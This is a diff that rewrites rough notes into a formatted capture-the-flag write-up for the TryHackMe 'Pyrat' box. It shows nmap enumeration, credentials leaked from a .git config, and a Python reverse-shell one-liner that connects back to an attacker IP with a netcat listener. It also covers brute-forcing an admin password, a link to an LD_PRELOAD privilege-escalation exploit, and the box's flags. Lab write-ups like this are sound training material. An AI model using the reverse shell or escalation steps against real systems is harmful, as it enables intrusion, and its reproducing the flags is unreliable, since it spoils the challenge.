@@ -1,86 +1,151 @@
-Note: use incongnito mode always for tryhackme
+🏴 Pyrat – TryHackMe Write-Up
 
-cache can cause error
-maintain the /etc/hosts file
-make reports properly
-study the working of the tools and understand logic and workflow 
--------------------------------------------------------------------------------
-=>nmap scan
-	22/tcp		open
-	8000/tcp	open
-----------------------------------------------username and password by using simple python script------------	
-=>nc <machine-ip> 8000
-	>>print(os.listdir("/root"))
-	Permission denied
-	>>print(os.lisdir("/opt/dev/.git/"))
+Note: Always use Incognito Mode while accessing TryHackMe machines.
+Cached data can cause unexpected errors.
 
----------------------------------------------------------
+📌 Important Notes
+
+Always use Incognito mode for web access
+
+Browser cache may lead to misleading behavior
+
+Maintain proper entries in /etc/hosts
+
+Study tools carefully and understand logic & workflow
+
+Document findings properly (important for reports & GitHub)
+
+🔍 Initial Enumeration
+Nmap Scan
+nmap -sC -sV <target-ip>
+
+
+Open Ports:
+
+22/tcp    open  ssh
+8000/tcp  open  http
+
+🌐 Service Enumeration (Port 8000)
+
+Connecting to the service:
+
+nc <target-ip> 8000
+
+Testing Python Code Execution
+print(os.listdir("/root"))
+# Permission denied
+
+print(os.listdir("/opt/dev/.git/"))
+
+
+📌 Access to .git directory revealed sensitive information.
+
+🔑 Credential Discovery
+
+Inside .git configuration:
+
 [credential "https://github.com"]
-        username = think
-        password = _TH1NKINGPirate$_
+    username = think
+    password = _TH1NKINGPirate$_
 
-run website on the ingonito
---it does not store cache data
+🐚 Reverse Shell Access
+Terminal 1 (Payload Execution)
+echo 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("YOUR-IP",4000));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+import pty; pty.spawn("sh")' | nc <target-ip> 8000
 
--------------------------------------root flag acess
-
-1) privilage escalation of root received from mail send by the use 
-https://github.com/bcoles/local-exploits/blob/master/CVE-2019-18862/exploit.ldpreload.sh 
-
-2) linpeas (Linux privilage escalation awesome scripts)
-
-3) password brute force(when endpoint is discovered)
-
-
---------------------------------reverse shell by using python payload-------
-
-terminal 1
-
-└─$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.208.147",4000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' | nc 10.82.185.125 8000    
-
-terminal 2
-
+Terminal 2 (Listener)
 nc -lvnp 4000
 
------------------------In shell(without think access)
 
-/opt/dev/.git (get the username and password of think)
+📌 Successfully obtained a shell.
 
-----access user think shell through ssh------------------
-get user.txt flag
+👤 User Access (think)
 
-see any usefull process running inside the root shell
-ps aux | grep root
+Using discovered credentials:
 
-see process running /root/pyrat.py script
-root         728  0.0  0.7  21872 14692 ?        S    11:31   0:00 python3 /root/pyrat.py
-root        1756  0.0  0.4  13944  9044 ?        Ss   12:21   0:00 sshd: think [priv]
+ssh think@<target-ip>
 
-
-read the script /root/pyrat.py script
-
----------------------root access
-
-from /root/pyrat.py script we learn about the endpoint admin and it differ from username
-it required password
-
-use brute force script
-password=abc123
-
-nc <target ip> 8000 
-admin
-Password abc123
-
-get shell acess
-
-print(open('/root/root.txt', 'r').read())
-
-get root flag
-------------------------------------------------------
-
-user flag:
+User Flag
 996bdb1f619a68361417cabca5454705
 
-root flag:
+🔎 Privilege Escalation Enumeration
+Running Processes
+ps aux | grep root
+
+
+Output revealed:
+
+root  python3 /root/pyrat.py
+
+
+📌 Script running as root:
+
+/root/pyrat.py
+
+🧠 Script Analysis
+
+From /root/pyrat.py:
+
+Discovered hidden admin endpoint
+
+Admin username ≠ system username
+
+Password required
+
+🔓 Privilege Escalation Techniques Used
+
+LinPEAS (Linux Privilege Escalation Awesome Script)
+
+Password Brute Force (after discovering endpoint)
+
+CVE-2019-18862 (LD_PRELOAD exploit)
+👉 https://github.com/bcoles/local-exploits/blob/master/CVE-2019-18862/exploit.ldpreload.sh
+
+🔐 Admin Access
+nc <target-ip> 8000
+
+Username: admin
+Password: abc123
+
+
+📌 Root shell obtained.
+
+🏁 Root Flag
+print(open('/root/root.txt', 'r').read())
+
 ba5ed03e9e74bb98054438480165e221
 
+🏆 Flags Summary
+Flag Type	Value
+User Flag	996bdb1f619a68361417cabca5454705
+Root Flag	ba5ed03e9e74bb98054438480165e221
+🧩 Key Learnings
+
+Misconfigured .git directories leak credentials
+
+Python code execution can lead to full compromise
+
+Always inspect running root processes
+
+Privilege escalation often hides in custom scripts
+
+Understanding workflow > blindly running tools
+
+🚀 Tools Used
+
+Nmap
+
+Netcat
+
+SSH
+
+LinPEAS
+
+Python Reverse Shell
+
+Git Enumeration****
